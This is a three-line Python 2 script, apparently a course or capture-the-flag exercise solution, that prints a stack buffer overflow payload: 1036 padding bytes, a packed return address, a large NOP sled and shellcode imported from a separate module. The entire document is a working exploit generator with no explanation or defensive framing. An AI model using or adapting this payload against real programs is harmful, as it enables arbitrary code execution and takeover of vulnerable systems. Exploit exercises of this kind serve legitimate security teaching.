import struct
from shellcode import shellcode
print 'a'*1036 + struct.pack('<I', 0xfffecffc) + '\x90'*16384 + shellcode
